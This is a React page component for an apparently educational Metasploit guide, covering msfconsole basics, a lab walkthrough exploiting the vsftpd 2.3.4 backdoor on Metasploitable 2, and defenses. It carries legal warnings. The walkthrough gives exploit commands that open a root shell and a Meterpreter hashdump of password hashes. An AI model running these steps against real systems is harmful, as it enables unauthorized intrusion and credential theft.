import { Helmet } from 'react-helmet-async'
import ToolLayout from '../components/ToolLayout'

function Section({ id, icon, title, subtitle, children }) {
  return (
    <section id={id} className="glass p-6 sm:p-7 mb-6 scroll-mt-24">
      <div className="flex items-center gap-3 mb-1">
        <span className="text-xl">{icon}</span>
        <h2 className="text-lg sm:text-xl font-extrabold text-white m-0">{title}</h2>
      </div>
      {subtitle && <p className="text-xs text-slate-400 mt-1 mb-4">{subtitle}</p>}
      {!subtitle && <div className="mb-2" />}
      <div className="space-y-4 text-sm text-slate-300 leading-relaxed">{children}</div>
    </section>
  )
}

function CodeBlock({ title, lines }) {
  return (
    <div className="rounded-xl overflow-hidden border border-white/10" style={{ background: '#0a0f1e' }}>
      <div className="flex items-center gap-2 px-4 py-2 border-b border-white/10" style={{ background: '#111827' }}>
        <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
        {title && <span className="ml-2 text-[11px] font-mono text-slate-400">{title}</span>}
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-relaxed font-mono text-green-300 whitespace-pre-wrap">
{lines}
      </pre>
    </div>
  )
}

function WarningBox({ children }) {
  return (
    <div className="rounded-xl p-4 border border-red-500/30" style={{ background: 'rgba(239,68,68,0.07)' }}>
      <div className="flex items-center gap-2 text-red-300 font-bold text-sm mb-1.5">⚠️ Legal &amp; Ethical Warning</div>
      <div className="text-xs text-red-200/80 leading-relaxed">{children}</div>
    </div>
  )
}

function InfoBox({ title, icon = '💡', children }) {
  return (
    <div className="rounded-xl p-4 border border-cyan-500/25" style={{ background: 'rgba(6,182,212,0.06)' }}>
      <div className="flex items-center gap-2 text-cyan-300 font-bold text-sm mb-1.5">{icon} {title}</div>
      <div className="text-xs text-slate-300 leading-relaxed">{children}</div>
    </div>
  )
}

function FeatureGrid({ items }) {
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
      {items.map(f => (
        <div key={f.t} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <div className="text-2xl mb-1">{f.i}</div>
          <div className="text-sm font-semibold text-white mb-0.5">{f.t}</div>
          <div className="text-xs text-slate-400">{f.d}</div>
        </div>
      ))}
    </div>
  )
}

function IssueRow({ issue, fix }) {
  return (
    <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
      <div className="flex items-start gap-2">
        <span className="text-red-400 font-bold mt-0.5">✕</span>
        <div className="min-w-0">
          <div className="text-sm font-semibold text-white mb-1">{issue}</div>
          <div className="text-xs text-slate-400 leading-relaxed">
            <span className="text-green-400 font-semibold">Fix: </span>{fix}
          </div>
        </div>
      </div>
    </div>
  )
}

const faq = [
  { q: "What is Metasploit?", a: "Metasploit Framework is the standard exploitation platform: a library of exploits (which break in), payloads (which run after), plus scanners and post-exploitation tools — all driven from the msfconsole terminal. Professionals use it to prove that a vulnerability is really exploitable." },
  { q: "Is Metasploit illegal?", a: "The framework is legal and open-source, used in audits worldwide. Using its exploits against systems you do not own or lack permission to test is illegal. Practice on Metasploitable 2, a VM built to be hacked, on your own computer." },
  { q: "What is the difference between exploit and payload?", a: "The exploit is the break-in: it abuses a specific vulnerability to gain code execution. The payload is what runs next: a shell, Meterpreter, or a command. You pair them: exploit opens the door, payload walks through." },
  { q: "What is Meterpreter?", a: "Meterpreter is Metasploit's advanced payload: an in-memory agent with commands for files, screenshots, network pivoting and privilege escalation — without writing files to disk. It is why defenders hunt in-memory behavior, not just files." },
  { q: "What does show options / set RHOSTS mean?", a: "show options lists what an exploit needs. RHOSTS is the target address, LHOST is your address for the callback, RPORT the target port. set fills each value; check marks confirm before you type exploit or run." },
  { q: "What is msfvenom?", a: "msfvenom builds standalone payload files — for example a lab binary that calls back to your listener. In real engagements it demonstrates payload delivery; in your lab it teaches why application allow-listing and email filtering matter." },
  { q: "How do I start a handler for a payload?", a: "use exploit/multi/handler, set the same PAYLOAD, LHOST and LPORT your payload points to, then run. The handler waits; when the lab payload executes, the session opens." },
  { q: "How do I defend against Metasploit?", a: "Patch quickly (most exploits target known CVEs), segment lab and production networks, run endpoint detection that flags in-memory agents, filter outbound connections, and keep tested offline backups." },
]

const howItWorks = [
  "Install Metasploit and launch msfconsole.",
  "Scan the lab VM and search for a matching exploit.",
  "Set RHOSTS/LHOST and run the exploit.",
  "Drive the Meterpreter session (sysinfo, hashdump in lab).",
  "Defend real systems: patch, segment, detect, back up.",
]

const schema = {
  '@context': 'https://schema.org',
  '@graph': [
    {
      '@type': 'TechArticle',
      headline: "Metasploit — Exploitation Framework Guide (Educational)",
      description: "Step-by-step Metasploit reference: msfconsole, exploit + payload pairing, Meterpreter basics on lab VMs, and defense.",
      about: "Metasploit Framework",
      educationalUse: 'Testing, education, and authorized use only',
    },
    {
      '@type': 'FAQPage',
      mainEntity: faq.map(f => ({
        '@type': 'Question',
        name: f.q,
        acceptedAnswer: { '@type': 'Answer', text: f.a },
      })),
    },
  ],
}

export default function hncker_metasploit() {
  return (
    <ToolLayout
      title="Metasploit — Exploitation Framework Guide"
      desc="Step-by-step Metasploit reference: msfconsole basics, exploit + payload + Meterpreter on Metasploitable 2 (your lab). Educational use only."
      icon="🎯"
      iconBg="linear-gradient(135deg, rgba(0,255,65,0.18), rgba(6,182,212,0.08))"
      category="security"
      slug="hncker/metasploit"
      faq={faq}
      howItWorks={howItWorks}
      schema={schema}
    >
      <Helmet>
        <meta name="robots" content="index, follow" />
        <meta property="og:image" content="https://www.uptools.in/assets/tools/metasploit/metasploit_scan.png" />
      </Helmet>

      <Section id="video" icon="🎬" title="Video Tutorial" subtitle="Learn it on the HNCKER channel">
        <div className="max-w-3xl mx-auto">
          <a href="https://www.youtube.com/@hncker" target="_blank" rel="noopener noreferrer"
            className="flex items-center gap-4 rounded-xl overflow-hidden border border-white/10 no-underline p-5 hover:border-red-500/40 transition-all"
            style={{ background: 'rgba(0,0,0,0.4)' }}>
            <div className="w-14 h-14 rounded-full bg-red-600/90 flex items-center justify-center shrink-0">
              <svg viewBox="0 0 24 24" className="w-6 h-6 ml-0.5 fill-white"><path d="M8 5v14l11-7z" /></svg>
            </div>
            <div>
              <p className="text-sm font-semibold text-white m-0">Metasploit — video walkthroughs on YouTube</p>
              <p className="text-xs text-slate-400 m-0 mt-1">Full tutorials on the @hncker channel. Watch, then practice below in your own lab.</p>
            </div>
          </a>
        </div>
      </Section>

      <WarningBox>
        Metasploit fires real exploits. Use it <b>only on your own lab VMs (Metasploitable 2) or targets with written permission</b>. Attacking any other system is a serious crime. This page is for <b>educational and authorized use only</b>.
      </WarningBox>

      <Section id="overview" icon="🎯" title="What is Metasploit?" subtitle="Prove vulns — on your lab VM">
        <p>
          <b>Metasploit</b> proves vulnerabilities are real: pick an exploit for the exact service version, pair it with a payload, and a Meterpreter session opens on your lab VM. That session — files, hashes, pivoting — is what unpatched CVEs hand to attackers.
        </p>
        <p>
          Every step here runs against Metasploitable 2 on your own computer. The defense writes itself: patch the CVE, segment the network, detect the agent — because this framework is exactly what arrives when you do not.
        </p>
        <FeatureGrid items={[
  { i: "💎", t: "2,000+ exploits", d: "Known-CVE modules, ready to run." },
  { i: "📦", t: "Payloads", d: "Shells, Meterpreter, staged and less." },
  { i: "🔍", t: "Aux scanners", d: "Version checks without exploiting." },
  { i: "🎓", t: "Lab-ready", d: "Built for Metasploitable practice." },
]} />
      </Section>

      <Section id="requirements" icon="⚙️" title="Requirements" subtitle="What you need before running">
        <ul className="list-none p-0 m-0 space-y-2">
          {["Kali Linux (pre-installed) + 4GB RAM for msfconsole", "Metasploitable 2 VM on the same host-only network", "The lab VM IP as RHOSTS, your IP as LHOST", "Written permission if anything is not yours"].map((t) => (
            <li key={t} className="flex items-start gap-2 text-slate-300">
              <span>☑️</span><span>{t}</span>
            </li>
          ))}
        </ul>
      </Section>

      <Section id="installation" icon="🛠️" title="Installation" subtitle="One command to install">
        <CodeBlock title="terminal" lines={`msfconsole -v
# Framework Version: 6.x ready`} />
        <CodeBlock title="debian / ubuntu" lines={`sudo apt update
sudo apt install metasploit-framework`} />
        <InfoBox title="Kali has it already">
          On Kali Linux Metasploit is pre-installed — <span className="font-mono">msfconsole</span> launches it (first start builds the database, be patient). Elsewhere use the official installers.
        </InfoBox>
      </Section>

      <Section id="find" icon="🔍" title="Step 1 — Find the Exploit" subtitle="Match exploit to version">
        <p className="text-xs text-slate-400">Scan the lab VM, then find the matching exploit:</p>
        <CodeBlock title="msfconsole" lines={`nmap -sV 192.168.1.10
# 21/tcp vsftpd 2.3.4
search vsftpd
# exploit/unix/ftp/vsftpd_234_backdoor`} />
        <InfoBox title="Match versions">
          search matches service names to exploit modules. The vsftpd 2.3.4 backdoor is the classic first exploit: exact version, exact module, instant lesson.
        </InfoBox>
      </Section>

      <Section id="configure" icon="⚙️" title="Step 2 — Configure" subtitle="Set targets and callbacks">
        <p className="text-xs text-slate-400">Load the exploit and fill its required settings:</p>
        <CodeBlock title="msfconsole" lines={`use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5`} />
        <InfoBox title="Check twice">
          RHOSTS is who you hit, LHOST is where the shell calls back (your Kali IP). Wrong LHOST is the number-one reason sessions never arrive.
        </InfoBox>
      </Section>

      <Section id="exploit" icon="🚀" title="Step 3 — Exploit (Lab Only)" subtitle="Fire and catch the shell">
        <p className="text-xs text-slate-400">Launch and step into the session:</p>
        <CodeBlock title="msfconsole" lines={`exploit
# Command shell session 1 opened
sessions -i 1
whoami
# root`} />
        <InfoBox title="Proof it works">
          exploit fires the module; sessions lists what came back. A shell on Metasploitable is the proof-of-concept auditors attach to reports.
        </InfoBox>
      </Section>

      <Section id="meterpreter" icon="💻" title="Step 4 — Meterpreter Basics" subtitle="Post-exploitation basics">
        <p className="text-xs text-slate-400">Drive the Meterpreter session basics:</p>
        <CodeBlock title="meterpreter" lines={`sysinfo
# Computer: metasploitable, OS: Linux
hashdump
# lab hashes listed (crack with John!)`} />
        <InfoBox title="In-memory agent">
          Meterpreter lives in memory and extends itself: migrate into a stable process, then explore. Everything here stays inside your lab VM.
        </InfoBox>
      </Section>


      <Section id="defense" icon="🛡️" title="Defense — Beat Framework Attacks" subtitle="Patch, segment, detect">
        <CodeBlock title="terminal" lines={`sudo apt update && sudo apt upgrade -y
# patch before exploits land`} />
        <FeatureGrid items={[
  { i: "🔧", t: "Patch fast", d: "Updates kill most exploits." },
  { i: "🗺️", t: "Segment", d: "Lab VMs off the main network." },
  { i: "👁️", t: "Detect shells", d: "IDS + egress filtering." },
  { i: "💾", t: "Backups", d: "Tested restores beat ransom." },
]} />
      </Section>

      <Section id="screenshots" icon="🖼️" title="Screenshot" subtitle="Metasploit in action">
        <figure className="rounded-xl overflow-hidden border border-white/10" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <img src="/assets/tools/metasploit/metasploit_scan.png" alt="Metasploit terminal session" width="960" height="540"
            className="w-full h-auto object-contain" loading="lazy" />
          <figcaption className="px-4 py-2 text-xs text-slate-400">msfconsole running an exploit against a lab VM</figcaption>
        </figure>
      </Section>

      <Section id="flags" icon="🏷️" title="Flags &amp; Options" subtitle="Every option explained">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {[["search", "Find modules: search vsftpd."], ["use", "Load a module: use exploit/..."], ["show options", "List required settings."], ["set / unset", "Fill values: set RHOSTS 1.2.3.4."], ["exploit / run", "Launch the loaded module."], ["sessions", "List and jump into open sessions."], ["background", "Park a session, keep it alive."], ["db_nmap", "Scan straight into the database."]].map(([flag, desc]) => (
            <div key={flag} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
              <div className="text-sm font-semibold text-green-300 font-mono mb-1">{flag}</div>
              <div className="text-xs text-slate-400">{desc}</div>
            </div>
          ))}
        </div>
      </Section>

      <Section id="issues" icon="🐞" title="Common Issues & Fixes" subtitle="Real problems people hit">
        <div className="space-y-3">
          {[["msfconsole hangs on first start", "It is building the PostgreSQL database — wait several minutes. If it never finishes, run msfdb init and restart the postgresql service."], ["Exploit completed but no session", "Wrong target config (RHOSTS/LPORT), the lab VM patched, or LHOST unreachable from the target. Verify networking both ways and match the module to the exact service version."], ["Payload blocked / session dies instantly", "Lab antivirus or the payload type mismatches (x64 vs x86). In the lab, try a plain shell payload first, then Meterpreter, and check handler LHOST/LPORT match."], ["PostgreSQL database errors", "Run sudo systemctl start postgresql, then msfdb reinit. Metasploitable labs work without the DB too, but search is slower."]].map(([issue, fix]) => (
            <IssueRow key={issue} issue={issue} fix={fix} />
          ))}
        </div>
      </Section>

      <Section id="resources" icon="🔗" title="Resources" subtitle="Official links">
        <div className="space-y-2">
          {[["📚", "Metasploit docs", "https://docs.metasploit.com/"], ["📖", "Metasploitable 2", "https://docs.rapid7.com/metasploit/metasploitable-2/"], ["🎬", "HNCKER tutorials", "https://www.youtube.com/@hncker"]].map(([i, label, href]) => (
            <a key={href} href={href} target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-2 rounded-lg px-3 py-2 border border-white/8 hover:border-brand/40 hover:bg-white/5 transition-all text-slate-300 hover:text-white no-underline">
              <span>{i}</span>
              <span className="text-sm font-medium">{label}</span>
              <span className="ml-auto text-indigo-300 text-xs font-mono break-all">{href}</span>
            </a>
          ))}
        </div>
      </Section>

      <Section id="disclaimer" icon="📜" title="Disclaimer" subtitle="Read before you run anything">
        <p>
          This documentation is provided <b>strictly for educational and authorized purposes</b>. Metasploit delivers real exploits, so use it only on your own lab VMs (Metasploitable 2) or targets with written permission. Attacking anyone else is a serious crime. The author and this site are not responsible for any misuse.
        </p>
      </Section>
    </ToolLayout>
  )
}
